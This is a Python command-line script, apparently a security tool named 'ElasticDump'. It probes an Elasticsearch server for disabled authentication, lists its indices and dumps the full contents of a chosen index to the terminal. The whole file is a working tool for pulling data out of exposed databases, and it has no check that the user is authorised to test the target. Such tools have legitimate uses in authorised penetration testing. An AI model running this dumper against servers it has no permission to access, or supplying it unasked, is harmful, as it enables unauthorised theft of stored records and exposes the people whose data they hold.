#!/usr/bin/python3

import argparse
import requests
import json
import time
from tabulate import tabulate

def get_security_users(ip_address, port_no):
    url = f'http://{ip_address}:{port_no}/_xpack/security/user'

    try:
        response = requests.get(url)

        if response.status_code == 500:
            data = response.text

            if "Enable security by setting" in data:
                print("[+] ElasticSearch Unauthenticated Found!")
                check_indices(ip_address, port_no)
            else:
                print("[-] ElasticSearch Authentication Enabled. Exiting...")

        else:
            print(f"Failed to retrieve data. Status code: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def check_indices(ip_address, port_no):
    indices_url = f'http://{ip_address}:{port_no}/_cat/indices?v'

    try:
        response = requests.get(indices_url)

        if response.status_code == 200:
            data = response.text.strip().split('\n')
            headers = data[0].split()
            rows = [line.split() for line in data[1:]]
            table = tabulate(rows, headers, tablefmt="pretty")
            print(f"[+] Indices Found:\n{table}")
        else:
            print("[-] Failed to retrieve indices. Status code: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"An error occurred while checking indices: {e}")

def dump_index_data(ip_address, port_no, index_name, size=None):
    url = f'http://{ip_address}:{port_no}/{index_name}/_search?pretty=true'
    if size:
        url = f'{url}&size={size}'
    max_retries = 3

    for retry in range(max_retries):
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"[+] Data for Index '{index_name}':")
                pretty_json = pretty_print_json(response.json())
                print(pretty_json)
                break
            elif retry < max_retries - 1:
                print(f"[-] Retrying... Attempt {retry + 1}/{max_retries}")
                time.sleep(2)
            else:
                print("[-] Server is unreachable. Maximum retries reached.")
        except requests.exceptions.RequestException as e:
            if retry < max_retries - 1:
                print(f"[-] Request failed. Retrying... Attempt {retry + 1}/{max_retries}")
                time.sleep(2)
            else:
                print("[-] Server is unreachable. Maximum retries reached.")
                print(f"[-] Error: {e}")

def pretty_print_json(data):
    formatted_json = json.dumps(data, indent=2, ensure_ascii=False)
    return "\n".join(f"\x1b[1;36m{x}\x1b[0m" for x in formatted_json.splitlines())

def print_banner():
    banner = """
         
  ______ _           _   _      _____                        
 |  ____| |         | | (_)    |  __ \                       
 | |__  | | __ _ ___| |_ _  ___| |  | |_   _ _ __ ___  _ __  
 |  __| | |/ _` / __| __| |/ __| |  | | | | | '_ ` _ \| '_ \ 
 | |____| | (_| \__ | |_| | (__| |__| | |_| | | | | | | |_) |
 |______|_|\__,_|___/\__|_|\___|_____/ \__,_|_| |_| |_| .__/ 
                                                      | |    
                                                      |_|    

    Made by Crypt0ace :)
    """
    print(banner)


def main():
    parser = argparse.ArgumentParser(description="Dump unauthenticated Elasticsearch database.")
    parser.add_argument("-i", "--ip", required=True, help="IP address of the Elasticsearch server")
    parser.add_argument("-p", "--port", required=True, help="Port number of the Elasticsearch server")
    parser.add_argument("-d", "--dump", required=False, help="Indices to dump")
    parser.add_argument("-s", "--size", required=False, help="Size of data to retrieve")

    args = parser.parse_args()

    if args.ip and args.port:
        ip_address = args.ip
        port_no = args.port
        get_security_users(ip_address, port_no)

        if args.dump:
            dump_index_data(ip_address, port_no, args.dump, args.size)
    else:
        parser.print_help()

if __name__ == '__main__':
    print_banner()
    main()
